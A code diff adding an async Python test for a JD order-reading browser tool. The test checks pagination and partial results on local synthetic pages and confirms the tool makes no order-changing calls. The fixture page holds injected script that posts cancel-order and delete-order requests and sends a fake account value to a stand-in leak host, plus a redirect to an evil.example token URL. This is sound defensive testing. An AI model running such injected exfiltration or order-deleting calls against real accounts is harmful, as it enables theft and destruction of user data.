@@ -173,6 +173,94 @@ class BrowserIntegrationTests(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(links, [{"ref": "e1", "href": "https://item.jd.com/123.html"}])
         self.assertNotIn("FAKE_", json.dumps(links))
 
+    async def test_orders_paginate_without_mutations_and_keep_partial_results(self):
+        """Use local synthetic pages to verify pagination, failed reads and context cleanup."""
+        from urllib.parse import parse_qs, urlparse
+        from unittest.mock import AsyncMock
+        from test_orders import fixture
+        from jd_taobao_mcp.orders import ORDER_FUNCTION, query_page, read_jd_orders
+        base = "https://order.jd.com/center/list.action"
+        api = f"https://api.m.jd.com/api?functionId={ORDER_FUNCTION}"
+        broken_second_page = False
+        requests = []
+
+        class Handler(BaseHTTPRequestHandler):
+            def do_GET(self):
+                page = int(parse_qs(urlparse(self.path).query).get("page", [1])[0])
+                if self.path.startswith("/redirect"):
+                    self.send_response(302)
+                    self.send_header("Location", "https://evil.example/FAKE_TOKEN")
+                    self.end_headers()
+                    return
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.end_headers()
+                html = f'''<script src="https://storage.360buyimg.com/redirect.js"></script>
+                    <iframe src="{base}?d=1&s=4096&page={page}"></iframe><script>
+                    (async()=>{{
+                        await Promise.allSettled([
+                            fetch('https://api.m.jd.com/api?functionId=pcorderop_cancelOrder',{{method:'POST'}}),
+                            fetch('https://api.m.jd.com/api?functionId=pcorder_center_deleteOrder',{{method:'POST'}}),
+                            fetch('https://collector.example/leak',{{method:'POST',body:'FAKE_ACCOUNT'}})
+                        ]);
+                        await fetch('{api}',{{method:'POST',body:new URLSearchParams({{body:JSON.stringify({{page:{page},d:1,s:4096}})}})}});
+                    }})();</script>'''
+                self.wfile.write(html.encode())
+
+            def do_POST(self):
+                page = int(parse_qs(urlparse(self.path).query)["page"][0])
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False} if broken_second_page and page == 2 else fixture(page)).encode())
+
+            def log_message(self, *args):
+                pass
+
+        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        original_fetch = Route.fetch
+
+        async def local_fetch(route, **kwargs):
+            self.assertEqual(kwargs["max_redirects"], 0)
+            request = route.request
+            requests.append(request.url)
+            if request.url.startswith(base+"?"):
+                target = "/document?"+urlparse(request.url).query
+            elif request.url == api:
+                target = f"/read?page={query_page(request.url, request.post_data or '')}"
+            else:
+                self.assertEqual(request.url, "https://storage.360buyimg.com/redirect.js")
+                target = "/redirect"
+            return await original_fetch(route, url=f"http://127.0.0.1:{server.server_port}{target}", **kwargs)
+
+        try:
+            before = len(self.browser.contexts)
+            await self.page.set_content("<title>Original page</title>")
+            with patch("jd_taobao_mcp.orders.sync_order_session", new=AsyncMock(return_value=(base, "ok"))), patch.object(Route, "fetch", local_fetch):
+                result = await read_jd_orders(self.context, 50, 10000)
+                self.assertEqual(result["count"], 21)
+                self.assertEqual(result["pages_read"], 2)
+                self.assertFalse(result["partial"])
+                self.assertNotIn("FAKE_", json.dumps(result))
+                self.assertEqual(len(self.browser.contexts), before)
+                self.assertEqual(await self.page.title(), "Original page")
+                result = await read_jd_orders(self.context, 3, 10000)
+                self.assertEqual(result["count"], 3)
+                self.assertEqual(result["pages_read"], 1)
+                self.assertTrue(result["partial"])
+                broken_second_page = True
+                result = await read_jd_orders(self.context, 50, 10000)
+                self.assertEqual(result["count"], 20)
+                self.assertTrue(result["partial"])
+                self.assertEqual(len(self.browser.contexts), before)
+            self.assertTrue(all("cancelOrder" not in u and "deleteOrder" not in u for u in requests))
+        finally:
+            await asyncio.to_thread(server.shutdown)
+            server.server_close()
+            thread.join()
+
     async def test_login_page_exchanges_fragment_and_completes_human_flow(self):
         import socket
         import uvicorn
